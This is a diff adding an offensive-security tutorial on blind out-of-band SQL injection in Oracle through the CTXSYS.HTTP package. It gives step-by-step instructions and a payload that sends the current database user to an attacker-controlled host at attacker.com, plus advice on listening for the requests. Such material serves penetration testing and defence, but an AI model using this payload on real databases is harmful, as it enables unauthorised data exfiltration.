@@ -1,0 +1,62 @@
+---
+title: 'CTXSYS.HTTP: Exploiting Blind Out-of-Band SQL Injection'
+description: Learn how to exploit CTXSYS.HTTP in Oracle for blind out-of-band SQL
+  injection.
+keywords:
+- CTXSYS.HTTP
+- Oracle
+- blind SQL injection
+- out-of-band
+- SQL injection
+- data exfiltration
+- database vulnerabilities
+- HTTP requests
+---
+
+# CTXSYS.HTTP
+
+## Context
+
+This article explores the exploitation of the `CTXSYS.HTTP` package for conducting blind out-of-band SQL injection attacks on Oracle databases. Readers should be familiar with HTTP headers, web form structures, and basic Oracle SQL injection techniques. This guide will focus on extracting information by triggering HTTP requests from the database to an attacker's server using SQL injection methods.
+
+## Theory
+
+### CTXSYS.HTTP Functionality
+
+The `CTXSYS.HTTP` package in Oracle is a powerful tool used for making HTTP requests from within the database. It's primarily used to send HTTP requests to external servers, a feature that attackers can exploit under certain conditions. By crafting specific SQL injection payloads, an attacker can manipulate this package to send HTTP requests to an attacker-controlled server, thereby facilitating data exfiltration or verification of injection success without directly returning data to the application user.
+
+### Blind Out-of-Band SQL Injection
+
+Blind out-of-band SQL injection is a technique where the attacker does not directly receive the data they want to extract. Instead, they induce the vulnerable application to send data to an external domain controlled by the attacker. This is particularly useful when the direct output of queries is not possible due to application constraints or when traditional blind SQL injection techniques (like boolean-based or time-based) are too slow or difficult. 
+
+In the context of Oracle databases, exploiting the `CTXSYS.HTTP` package for blind out-of-band SQL injection involves crafting payloads that cause the database to access URLs that include the data to be exfiltrated. Once the URL is accessed, the attacker monitors their server to capture this outbound HTTP request, thereby obtaining the desired information off-band.
+
+## Practice
+
+### Exploiting CTXSYS.HTTP for Blind Out-of-Band SQL Injection
+
+To exploit the `CTXSYS.HTTP` package for blind out-of-band SQL injection, follow these steps:
+
+- **Identify Injectable Parameters:**
+  - Begin by identifying fields within the Oracle database application that are vulnerable to SQL injection. This may involve testing input fields, URL parameters, or other input vectors susceptible to SQL injection.
+
+- **Inject the Payload:**
+  - Once a vulnerable parameter is identified, use the following SQL command to trigger an HTTP request from the database:
+
+    ```sql
+    SELECT CTXSYS.HTTP('http://attacker.com/'||(SELECT user FROM dual)) FROM dual;
+    ```
+
+  - In this command, `SELECT user FROM dual` extracts the current database user, and `http://attacker.com/` should be replaced with the attacker's server URL, where the HTTP request will be sent.
+
+- **Monitor the Attacker-Controlled Server:**
+  - Set up an HTTP server, such as using a simple Python HTTP server or a more sophisticated tool like Burp Suite, to listen for incoming connections. This server will capture any HTTP requests sent by the database, including the appended data.
+
+### Outcome
+
+By following this technique, data such as usernames or other query results can be exfiltrated from the Oracle database to an attacker's server via HTTP requests. This method is particularly effective in scenarios where direct data retrieval is not possible due to application constraints or defensive measures in place.
+
+## Tools
+
+- **Burp Suite**: A comprehensive suite of tools used for analyzing web applications and detecting injection points.
+- **SQLMap**: An automated SQL injection and database takeover tool that can be used to detect injectable fields and facilitate SQL exploratory testing.
